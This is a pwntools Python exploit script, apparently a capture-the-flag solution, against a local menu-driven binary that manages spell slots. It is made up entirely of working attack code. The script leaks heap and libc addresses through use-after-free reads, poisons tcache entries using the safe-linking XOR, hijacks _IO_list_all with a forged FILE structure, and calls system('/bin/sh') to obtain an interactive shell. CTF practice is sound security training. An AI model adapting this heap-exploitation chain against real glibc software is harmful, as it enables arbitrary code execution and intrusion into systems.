#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or "./main")
libc = ELF(exe.libc.path)

def create(idx, name=b"\x00", effect=b"\x00", mana_cost=0, cooldown=0, element=0):
    io.sendlineafter(b"choice: ".capitalize(), b"1")
    io.sendlineafter(b": ", str(idx).encode())
    io.sendafter(b"name: ", name)
    io.sendafter(b"effect: ", effect)
    io.sendlineafter(b"mana cost: ", str(mana_cost).encode())
    io.sendlineafter(b"cooldown (in seconds): ", str(cooldown).encode())
    io.sendlineafter(b": ", str(element).encode())

def edit(idx, name=b"\x00", effect=b"\x00", mana_cost=0, cooldown=0, element=0):
    io.sendlineafter(b"choice: ".capitalize(), b"2")
    io.sendlineafter(b": ", str(idx).encode())
    io.sendafter(b"name: ", name)
    io.sendafter(b"effect: ", effect)
    io.sendlineafter(b"mana cost: ", str(mana_cost).encode())
    io.sendlineafter(b"cooldown (in seconds): ", str(cooldown).encode())
    io.sendlineafter(b": ", str(element).encode())

def view(idx):
    io.sendlineafter(b": ", b"3")
    io.recvuntil(f"slot {idx}".capitalize().encode())
    io.recvuntil(b"name: ".capitalize())
    return io.recvline().strip()

def delete(idx):
    io.sendlineafter(b"choice: ".capitalize(), b"4")
    io.sendlineafter(b": ", str(idx).encode())

def feedback(size, data):
    io.sendlineafter(b": ", b"5")
    io.sendlineafter(b"size of feedback: ", str(size).encode())
    io.sendafter(b"feedback: ", data)

io = process(exe.path)

for i in range(0, 20): create(i)
for i in range(0, 7): delete(i)

heap_base = u64(view(0).ljust(8, b'\x00')) << 12
log.info("heap base: " + hex(heap_base))

edit(7, name=p64(0x0) + p64(0x81) + p64(heap_base >> 12))

create(20)
create(21)
delete(21)
delete(20)

edit(20, name=p64((heap_base+0x620)^(heap_base>>12)))

create(20)
create(21, element=0x501)
delete(8)

libc.address = u64(b"\x20" + view(8).ljust(7, b'\x00')) - 0x203b20
log.info("libc base: " + hex(libc.address))

edit(21, element=0x0)
edit(7, name=b"/bin/sh\x00".ljust(0x8, b"\x00") + p64(0)*2 + p64(libc.symbols["system"]))
edit(8, name=p64(0) + p64(libc.address + 0x205700), effect=p64((heap_base + 0x620) - 0x20) + p64(0x0)*3 + p64(heap_base + 0x620) + p64(0x0)*2 + p64(libc.address + 0x202228 + 0x30))

edit(6, name=p64(libc.symbols["_IO_list_all"]^(heap_base >> 12)))

feedback(108, b'A'*8)
feedback(108, p64(heap_base + 0x620))

io.sendlineafter(b"choice: ".capitalize(), b"6")
io.interactive()
